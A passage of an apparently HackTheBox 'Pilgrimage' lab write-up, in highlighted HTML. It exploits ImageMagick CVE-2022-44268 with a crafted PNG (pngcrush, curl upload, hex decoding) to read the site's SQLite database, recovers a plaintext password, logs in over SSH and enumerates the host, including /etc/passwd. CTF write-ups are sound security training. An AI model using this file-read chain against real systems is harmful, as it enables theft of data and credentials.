+</span></span></span></span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-meta z-array z-php">                <span class="z-punctuation z-section z-array z-end z-php">]</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Location: /?message=</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-variable z-other z-php"><span class="z-punctuation z-definition z-variable z-php">$</span>upload_path</span> <span class="z-keyword z-operator z-string z-php">.</span> <span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">&amp;status=success</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-punctuation z-section z-block z-end z-php">}</span> <span class="z-keyword z-control z-php">else</span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">            <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Location: /?message=Image shrink failed&amp;status=fail</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-end z-php">}</span> <span class="z-keyword z-control z-php">else</span> <span class="z-punctuation z-section z-block z-begin z-php">{</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">        <span class="z-meta z-function-call z-php"><span class="z-support z-function z-network z-php">header</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-begin z-php">(</span></span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-string z-quoted z-double z-php"><span class="z-punctuation z-definition z-string z-begin z-php">&quot;</span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php"></span></span><span class="z-string z-quoted z-double z-php"><span class="z-meta z-string-contents z-quoted z-double z-php">Location: /?message=Image shrink failed&amp;status=fail</span><span class="z-punctuation z-definition z-string z-end z-php">&quot;</span></span><span class="z-meta z-function-call z-php"><span class="z-meta z-group z-php"><span class="z-punctuation z-section z-group z-end z-php">)</span></span></span></span></span><span class="z-punctuation z-terminator z-expression z-php">;</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php">    <span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"><span class="z-punctuation z-section z-block z-end z-php">}</span>
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-embedded z-block z-php"><span class="z-source z-php"></span><span class="z-punctuation z-section z-embedded z-end z-php">?&gt;</span><span class="z-meta z-html-newline-after-php z-php">
+</span></span></span></span><span class="z-embedding z-php"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></span></code></pre>
+<p>In fact, the website uses the Bulletproof PHP library to handle image uploads.</p>
+<p>The image processing is the most interesting part. If a POST request is received
+with an image to upload, the website places it in the
+<code>/var/www/pilgrimage.htb/tmp</code> folder. It generates a new name with the <code>uniqid</code>
+function, and then it executes the OS command
+<code>/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/</code> with the
+uplodaded filename, MIME type, <code>-resize 50% /var/www/pilgrimage.htb/shrunk/</code>
+string, the new name and the new MIME type.</p>
+<p>If the user is logged in, the website updates a SQLite database stored at
+<code>/var/db/pilgrimage</code> to save the original filename and the processed image URL.</p>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>One thing that struck me here is that the website specifically uses the <code>magick</code>
+binary included in the repository, instead of using the binary on the system.
+There's probably something behind this, so let's retrieve the version of the
+given binary:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> /workspace/git/magick<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>version</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
+</span><span class="z-text z-plain">Copyright: (C) 1999 ImageMagick Studio LLC
+</span><span class="z-text z-plain">License: https://imagemagick.org/script/license.php
+</span><span class="z-text z-plain">Features: Cipher DPC HDRI OpenMP(4.5) 
+</span><span class="z-text z-plain">Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+</span><span class="z-text z-plain">Compiler: gcc (7.5)
+</span></code></pre>
+<p>It's using the version <code>7.1.0-49</code>.</p>
+<p>And if we search <a href="https://www.exploit-db.com/">ExploitDB</a> for
+<code>ImageMagick 7.1.0-49</code>, we find
+<a href="https://www.exploit-db.com/exploits/51261">ImageMagick 7.1.0-49 - Arbitrary File Read</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268">CVE-2022-44268</a>)!</p>
+<h4 id="lfi-cve-2022-44268">LFI (<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268">CVE-2022-44268</a>)</h4>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268">CVE-2022-44268</a> is an
+information disclosure vulnerability affecting ImageMagick version <code>7.1.0-49</code>.
+When this utility parses a specifically crafted PNG file, like when performing
+the resizing operation, the resulting image can embed the content of an
+arbitrary file.</p>
+<p>You can read more about it on
+<a href="https://www.metabaseq.com/imagemagick-zero-days/">Metabase Q</a>.</p>
+<h5 id="exploitation">Exploitation</h5>
+<p>I'll follow the instructions of
+<a href="https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC">this PoC</a>
+to exploit it.</p>
+<p>The goal is to read the content of the <code>/var/db/pilgrimage</code> file, which is used
+by the website to store user-related data.</p>
+<p>I'll start by adding this text to an existing <code>image.png</code> file:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> pngcrush<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>text</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>a<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>profile<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/var/db/pilgrimage<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/image.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Let's check if it worked:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> exiv2<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>pS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/pngout.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">  175715 | tEXt  |      26 | profile./var/db/pilgrimage     | 0x704d8d3d
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It did.</p>
+<p>Now let's ask the website to shrink the image containing our payload:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://pilgrimage.htb/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>F</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>toConvert=@/workspace/pngout.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>oP</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>(?&lt;=message=)[^&amp;]+<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">http://pilgrimage.htb/shrunk/65f75d64c3f73.png
+</span></code></pre>
+<p>Then, let's download the processed image.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> wget <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://pilgrimage.htb/shrunk/65f75d64c3f73.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>O</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/processed.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Finally, let's extract the content of the SQLite binary hidden inside the
+processed image.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> identify<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>verbose</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/processed.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>Pv</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>^( |Image)<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">xxd</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/pilgrimage.sqlite<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<h4 id="inspecting-var-db-pilgrimage">Inspecting <code>/var/db/pilgrimage</code></h4>
+<p>Now that we have extracted the SQLite database used by the website, let's
+explore it.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlite3 <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/pilgrimage.sqlite<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">sqlite&gt;
+</span></code></pre>
+<h4 id="tables">Tables</h4>
+<p>Let's see which tables are available.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlite</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> .tables</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">images  users
+</span></code></pre>
+<p>The <code>images</code> table is probably much less interesting than <code>users</code>.</p>
+<h4 id="users-s-columns"><code>users</code>'s columns</h4>
+<p>Let's continue our enumeration of this database by checking the content of the
+<code>users</code> table.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlite</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> .schema users</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
+</span></code></pre>
+<p>Okay, so this table contains 2 columns.</p>
+<h4 id="users-s-columns-content"><code>users</code>'s columns content</h4>
+<p>Let's retrieve the content of the <code>username</code> and <code>password</code> columns.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sqlite</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> SELECT username, password FROM users</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">emily|abigchonkyboi123
+</span></code></pre>
+<p>There's a single set of credentials: <code>emily</code> with the password
+<code>abigchonkyboi123</code>.</p>
+<h2 id="foothold-ssh">Foothold (SSH)</h2>
+<p>Let's try the credentials we just found to connect to Pilgrimage over SSH.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>emily@10.10.11.219<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.11.219 (10.10.11.219)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">emily@10.10.11.219&#39;s password:
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">emily@pilgrimage:~$
+</span></code></pre>
+<p>Nice!</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>emily</code> (obviously).</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Pilgrimage's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Pilgrimage is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/os-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;
+</span><span class="z-text z-plain">NAME=&quot;Debian GNU/Linux&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;11&quot;
+</span><span class="z-text z-plain">VERSION=&quot;11 (bullseye)&quot;
+</span><span class="z-text z-plain">VERSION_CODENAME=bullseye
+</span><span class="z-text z-plain">ID=debian
+</span><span class="z-text z-plain">HOME_URL=&quot;https://www.debian.org/&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</span></code></pre>
+<p>Okay, so it's Debian 11.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Pilgrimage.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">5.10.0-23-amd64
+</span></code></pre>
+<p>It's <code>5.10.0</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">emily
+</span><span class="z-text z-plain">root
+</span></code></pre>
+<p>There's <code>emily</code> (us) and <code>root</code>.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">emily
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">_laurel
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">systemd-timesync
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:cc:ed brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    altname enp3s0
+</span><span class="z-text z-plain">    altname ens160
+</span><span class="z-text z-plain">    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Pilgrimage's hostname?</p>
